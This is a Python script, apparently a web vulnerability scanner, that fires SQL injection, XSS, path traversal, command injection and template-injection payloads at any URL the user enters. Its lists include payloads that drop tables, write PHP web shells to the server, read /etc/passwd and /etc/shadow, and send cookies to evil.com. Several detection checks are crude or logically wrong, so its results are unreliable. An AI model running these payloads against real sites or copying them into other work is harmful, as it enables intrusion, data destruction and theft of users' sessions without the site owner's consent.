import asyncio
import aiohttp

def print_banner():
    banner = [
        " ____   ____    .__           _________              __                 ____  ___ ",
        "\\   \\ /   /_ __|  |   ____  /   _____/ ____   _____/  |________ ___.__.\\   \\/  / ",
        " \\   Y   /  |  \\  |  /    \\ \\_____  \\_/ __ \\ /    \\   __\\_  __ <   |  | \\     /  ",
        "  \\     /|  |  /  |_|   |  \\/        \\  ___/|   |  \\  |  |  | \\/\\___  | /     \\   ",
        "   \\___/ |____/|____/___|  /_______  /\\___  >___|  /__|  |__|   / ____|/___/\\  \\  ",
        "                         \\/        \\/     \\/     \\/             \\/           \\_/  "
    ]
    for line in banner:
        print(line)

async def check_vulnerabilities(url):
    async with aiohttp.ClientSession() as session:
        # SQL Injection payloads
        injection_payloads = [
            "'", "\"", "1'", "1\"", "'; DROP TABLE users; --", "' OR 1=1 --",
            "' AND 1=1 --", "' UNION SELECT user, password FROM users --",
            "' UNION SELECT user, password FROM information_schema.users --",
            "' UNION SELECT table_name, column_name FROM information_schema.columns --",
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
            "' UNION SELECT load_file('/etc/passwd') --",
            "' UNION SELECT '<?php echo \"Hello, world!\"; ?>' INTO OUTFILE '/var/www/html/hello.php' --",
            "' UNION SELECT '<?php echo shell_exec($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php' --",
            "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --",
            "' UNION SELECT '<?php system($_REQUEST[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --",
        ]
        for payload in injection_payloads:
            async with session.get(url + "?input=" + payload) as response:
                if "SQL syntax" in await response.text():
                    print("[+] Possible SQL Injection vulnerability found at:", url)
                    break
        else:
            print("[-] No SQL Injection vulnerability found at:", url)

        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS Vulnerability Found')</script>",
            "<img src=x onerror=alert('XSS Vulnerability Found')>",
            "<svg/onload=alert('XSS Vulnerability Found')>",
            "';alert('XSS Vulnerability Found');//",
            "javascript:alert('XSS Vulnerability Found')",
            "<iframe src='javascript:alert(XSS Vulnerability Found)'></iframe>",
            "<object data='javascript:alert(XSS Vulnerability Found)'></object>",
            "<body onscroll=alert('XSS Vulnerability Found')></body>",
            "<marquee onstart=alert('XSS Vulnerability Found')></marquee>",
            "<details onToggle=alert('XSS Vulnerability Found')></details>",
            "<video onresize=alert('XSS Vulnerability Found')></video>",
            "<audio onplaying=alert('XSS Vulnerability Found')></audio>",
            "<svg/onload=eval(atob('YWxlcnQoImh0dHA6Ly9zMy5hbWF6b24uY29tIik='))>",
            "<isindex formaction='javascript:alert(XSS Vulnerability Found)'>",
            "<math href='javascript:alert(XSS Vulnerability Found)'>CLICKME</math>",
            "<math><a xlink:href='javascript:alert(XSS Vulnerability Found)'>CLICKME</a></math>",
            "<img src='x' onerror='javascript:alert(XSS Vulnerability Found)'>",
            "<a href='javascript:alert(XSS Vulnerability Found)'>CLICKME</a>",
            "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIFZlbmRvciBGb3VuZCIpPC9zY3JpcHQ+'>CLICKME</a>",
            "<form id='f' onforminput='javascript:alert(XSS Vulnerability Found)'></form>",
            "<object type='text/x-scriptlet' data='data:text/html,<script>alert(`XSS Vulnerability "
            "Found`)</script>'></object>",
            "<object data='data:text/html;base64,"
            "PHN2Zy9vbmxvYWQ9YWxlcnQoImh0dHA6Ly9zMy5hbWF6b24uY29tIik8L3N2Zz4='></object>",
            "<svg/onload=setTimeout(function(){alert(XSS Vulnerability Found)},0)>",
            "<svg/onload=prompt`XSS Vulnerability Found`>",
            "<svg/onload=confirm`XSS Vulnerability Found`>",
            "<script>document.body.innerHTML = '<h1>XSS Vulnerability Found</h1>';</script>",
            "<img src=x onerror='document.body.innerHTML = <h1>XSS Vulnerability Found</h1>;'>",
            "<a href='javascript:document.body.innerHTML=<h1>XSS Vulnerability Found</h1>;'>CLICKME</a>",
            "<svg/onload=fetch(http://evil.com/steal-cookie?cookie=${document.cookie})>",
            "<iframe srcdoc='<script>alert(XSS Vulnerability Found)</script>'></iframe>",
            "<video src=1 onerror='document.body.innerHTML=<h1>XSS Vulnerability Found</h1>;'>",
            "<embed src=javascript:alert(XSS Vulnerability Found)></embed>",
            "<object data='javascript:alert(XSS Vulnerability Found)'></object>",
            "<style>@import'http://evil.com/xss.css';</style>",
            "<script src='http://evil.com/xss.js'></script>",
            "<iframe src=//www.youtube.com/embed/VIDEO_ID allowfullscreen></iframe>",
            "<iframe srcdoc='&lt;script&gt;alert(XSS Vulnerability Found)&lt;/script&gt;'></iframe>",
            "<form><input type=submit formaction='javascript:alert(XSS Vulnerability Found)'></form>",
            "<img src='1' onerror='fetch(http://evil.com/steal-cookie?cookie=${document.cookie})'>",
            "<iframe src=javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})></iframe>",
            "<audio src=javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})></audio>",
            "<video src=javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})></video>",
            "<svg/onload=fetch(http://evil.com/steal-cookie?cookie=${document.cookie})>",
            "<iframe src=javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})></iframe>",
            "<body onscroll=fetch(http://evil.com/steal-cookie?cookie=${document.cookie})></body>",
            "<marquee onstart=fetch(http://evil.com/steal-cookie?cookie=${document.cookie})></marquee>",
            "<details onToggle=fetch(http://evil.com/steal-cookie?cookie=${document.cookie})></details>",
            "<video onresize=fetch(http://evil.com/steal-cookie?cookie=${document.cookie})></video>",
            "<audio onplaying=fetch(http://evil.com/steal-cookie?cookie=${document.cookie})></audio>",
            "<svg/onload=fetch(http://evil.com/steal-cookie?cookie=${document.cookie})>",
            "<iframe src='javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})'></iframe>",
            "<body onscroll='javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})'></body>",
            "<marquee onstart='javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})'></marquee>",
            "<details onToggle='javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})'></details>",
            "<video onresize='javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})'></video>",
            "<audio onplaying='javascript:fetch(http://evil.com/steal-cookie?cookie=${document.cookie})'></audio>",
        ]
        for payload in xss_payloads:
            async with session.get(url + "?input=" + payload) as response:
                if payload in await response.text():
                    print("[+] Possible XSS vulnerability found at:", url)
                    break
        else:
            print("[-] No XSS vulnerability found at:", url)

        # Path Traversal payloads
        traversal_payloads = [
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/apache2/error.log",
            "../../../../proc/self/environ",
            "../../../../proc/version",
            "../../../../proc/cmdline",
            "../../../../proc/mounts",
            "../../../../proc/net/tcp",
            "../../../../proc/net/arp",
            "../../../../proc/net/dev",
            "../../../../proc/net/route",
            "../../../../proc/net/wireless",
            "../../../../proc/net/fib_trie",
            "../../../../proc/net/sockstat",
            "../../../../proc/net/sockstat6",
            "../../../../proc/sys/kernel/hostname",
            "../../../../proc/sys/kernel/osrelease",
            "../../../../proc/sys/kernel/ostype",
            "../../../../proc/sys/kernel/version",
            "../../../../proc/sys/kernel/random/boot_id",
            "../../../../proc/self/cmdline",
            "../../../../proc/self/status",

        ]
        for payload in traversal_payloads:
            async with session.get(url + payload) as response:
                if "root:" in await response.text():
                    print("[+] Possible Path Traversal vulnerability found at:", url)
                    break
        else:
            print("[-] No Path Traversal vulnerability found at:", url)

        # Command Injection payloads
        command_payloads = [
            ";ls", "| ls", "$(ls)", "&& ls", "; cat /etc/passwd", "| cat /etc/passwd", "$(cat /etc/passwd)",
            "; cat /etc/shadow", "| cat /etc/shadow", "$(cat /etc/shadow)",
            ";id", "| id", "$(id)", "&& id", ";whoami", "| whoami", "$(whoami)", "&& whoami",
        ]
        for payload in command_payloads:
            async with session.get(url + payload) as response:
                if "index.html" in await response.text():
                    print("[+] Possible Command Injection vulnerability found at:", url)
                    break
        else:
            print("[-] No Command Injection vulnerability found at:", url)

        # Remote Code Execution payloads
        rce_payloads = [
            "${{7*7}}", "${{system('whoami')}}", "${{exec('ls')}}",
            "${{exec(\"cat /etc/passwd\")}}", "${{require('child_process').execSync('ls').toString()}}",
            "${{require('child_process').execSync('cat /etc/passwd').toString()}}",
            "${{require('child_process').exec('ls', (error, stdout, stderr) => {{console.log(stdout)}})}}",
            "${{require('child_process').exec('cat /etc/passwd', (error, stdout, stderr) => {{console.log(stdout)}})}}",
            "${{require('child_process').execFile('/bin/ls', ['-la'], (error, stdout, stderr) => {{console.log("
            "stdout)}})}}",
            "${{require('child_process').execFile('/bin/cat', ['/etc/passwd'], (error, stdout, stderr) => {{console.log("
            "stdout)}})}}",
        ]
        for payload in rce_payloads:
            async with session.get(url + "?input=" + payload) as response:
                if "49" in await response.text():  # Change this condition based on expected RCE response
                    print("[+] Possible Remote Code Execution vulnerability found at:", url)
                    break
        else:
            print("[-] No Remote Code Execution vulnerability found at:", url)

        # CSRF vulnerability check
        csrf_payload = "http://malicious.com/transfer?amount=1000&to=attacker"
        async with session.post(url, data={'transfer': csrf_payload}) as response:
            if "Transfer successful" in await response.text():
                print("[+] Possible CSRF vulnerability found at:", url)
            else:
                print("[-] No CSRF vulnerability found at:", url)

        # File Upload vulnerability check
        async with session.post(url, data={'file': 'payload.php', 'submit': 'Upload'}) as response:
            if "payload.php" in await response.text():
                print("[+] Possible File Upload vulnerability found at:", url)
            else:
                print("[-] No File Upload vulnerability found at:", url)

        # Authentication Bypass vulnerability check
        async with session.get(url, headers={'Authorization': 'admin'}) as response:
            if "Admin panel" in await response.text():
                print("[+] Possible Authentication Bypass vulnerability found at:", url)
            else:
                print("[-] No Authentication Bypass vulnerability found at:", url)

        # Information Disclosure vulnerability check
        async with session.get(url + "/.git/config") as response:
            if "[core]" in await response.text():
                print("[+] Possible Information Disclosure vulnerability found at:", url)
            else:
                print("[-] No Information Disclosure vulnerability found at:", url)

        # Session Fixation vulnerability check
        async with session.get(url) as response:
            cookies = session.cookie_jar.filter_cookies(url)
            original_session_id = cookies.get('session_id')
            async with session.get(url) as response:
                cookies = session.cookie_jar.filter_cookies(url)
                new_session_id = cookies.get('session_id')
                if original_session_id != new_session_id:
                    print("[+] Possible Session Fixation vulnerability found at:", url)
                else:
                    print("[-] No Session Fixation vulnerability found at:", url)


async def main():
    website_url = input("Enter the URL of the website to check for vulnerabilities: ")
    await check_vulnerabilities(website_url)
#

if __name__ == "__main__":
    print_banner()
    asyncio.run(main())
